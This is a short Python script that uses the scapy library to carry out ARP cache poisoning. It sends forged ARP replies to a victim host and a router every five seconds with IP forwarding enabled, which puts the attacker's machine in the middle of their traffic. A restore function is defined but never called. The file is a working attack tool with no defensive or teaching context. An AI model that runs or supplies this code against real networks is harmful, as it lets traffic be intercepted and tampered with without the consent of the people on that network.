from scapy.all import *
import time
import ip_forwarding

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
    # our mac(which is not mentioned here) will be replaced on victim arp cache


def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)

ip_forwarding.enable()

while True:
    victimIP="192.168.1.105"
    routerIP="192.168.1.106"
    victimMAC="08:00:27:5e:53:45"
    routerMAC="08:00:27:34:0f:15"
    poison(routerIP,victimIP,routerMAC,victimMAC)
    time.sleep(5)